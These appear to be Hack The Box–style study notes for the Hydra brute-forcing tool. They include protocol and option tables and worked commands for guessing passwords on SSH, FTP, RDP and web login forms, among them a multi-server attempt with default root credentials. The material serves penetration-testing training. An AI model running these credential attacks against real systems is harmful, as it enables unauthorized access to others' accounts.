# Hydra Protocol Reference


| Protocol        | Service                          | Description                                                                                             | Example Command                                                                                                |
| --------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `ftp`           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| `ssh`           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| `http-get/post` | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| `smtp`          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| `pop3`          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| `imap`          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| `mysql`         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| `mssql`         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| `vnc`           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| `rdp`           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

## Hydra Command Options

| Option                  | Description                                                                                                | Example                                                                                                         |
| ----------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).    | `hydra -l admin ...` or `hydra -L usernames.txt ...`                                                            |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...`                                                      |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.           | `hydra -t 4 ...`                                                                                                |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                      | `hydra -f ...`                                                                                                  |
| `-s PORT`               | Port: Specify a non-default port for the target service.                                                   | `hydra -s 2222 ...`                                                                                             |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.  | `hydra -v ...` or `hydra -V ...` (for even more verbosity)                                                      |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.      | `hydra ssh://192.168.1.100`                                                                                     |
| `/OPT`                  | Service-specific options: Provide any additional options required by the target service.                   | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |


## Common Hydra Options

- `-l <username>` - Single username
- `-L <userlist>` - Username list file
- `-p <password>` - Single password
- `-P <passlist>` - Password list file
- `-t <threads>` - Number of parallel threads
- `-f` - Stop after first successful login
- `-v` - Verbose output
- `-V` - Very verbose output
### example
	Use username and password lists
		```
		hydra -L usernames.txt -P passwords.txt www.example.com http-get
		```

## Targeting multiple SSH servers


Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the default username "root" and password "toor." To efficiently test all these servers simultaneously, use the following Hydra command:

Hydra

```bash
 hydra -l root -p toor -M targets.txt ssh
```
This command instructs Hydra to:

- Use the username "root".
- Use the password "toor".
- Target all IP addresses listed in the `targets.txt` file.
- Employ the `ssh` module for the attack.

Hydra will execute parallel brute-force attempts on each server, significantly speeding up the process.
## Testing FTP Creds on a non-standard port.
Imagine you need to assess the security of an FTP server hosted at `ftp.example.com`, which operates on a non-standard port `2121`. You have lists of potential usernames and passwords stored in `usernames.txt` and `passwords.txt`, respectively. To test these credentials against the FTP service, use the following Hydra command:

Hydra

```shell-session
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

This command instructs Hydra to:

- Use the list of usernames from the `usernames.txt` file.
- Use the list of passwords from the `passwords.txt` file.
- Target the FTP service on `ftp.example.com` via port `2121`.
- Use the `ftp` module and provide verbose output (`-V`) for detailed monitoring.

Hydra will attempt to match each username-password combination against the FTP server on the specified port.

## Brute-Forcing a web Login
Suppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is "admin," and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:

Hydra

```shell-session
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

This command instructs Hydra to:

- Use the username "admin".
- Use the list of passwords from the `passwords.txt` file.
- Target the login form at `/login` on `www.example.com`.
- Employ the `http-post-form` module with the specified form parameters.
- Look for a successful login indicated by the HTTP status code `302`.

Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.

### Advanced RDP Brute-Forcing

Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:
```shell-session
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

This command instructs Hydra to:

- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.

Hydra will generate and test all possible password combinations within the specified parameters, attempting to break into the RDP service.

```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
# Hydra command
underhill341@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

## ## http-post-form

**To follow along, start the target system via the question section at the bottom of the page.**

Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body. By leveraging Hydra's capabilities, attackers can efficiently test numerous credential combinations against a login form, potentially uncovering valid logins.

The general structure of a Hydra command using `http-post-form` looks like this:

Login Forms

```shell-session
underhill341@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```

### Understanding the Condition String

In Hydra’s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts. Hydra primarily relies on failure conditions (`F=...`) to determine when a login attempt has failed, but you can also specify a success condition (`S=...`) to indicate when a login is successful.

The failure condition (`F=...`) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (like "Invalid username or password") when the login fails. For example, if a login form returns the message "Invalid credentials" on a failed attempt, you can configure Hydra like this:

Code: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

In this case, Hydra will check each response for the string "Invalid credentials." If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair. This approach is commonly used because failure messages are usually easy to identify.

However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using HTTP status code `302`), or displays specific content (like "Dashboard" or "Welcome"), you can configure Hydra to look for that success condition using `S=`. Here’s an example where a successful login results in a 302 redirect:

Code: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

In this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:

Code: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra will now register the login as successful if it finds the word "Dashboard" in the server’s response.

Before unleashing Hydra on a login form, it's essential to gather intelligence on its inner workings. This involves pinpointing the exact parameters the form uses to transmit the username and password to the server.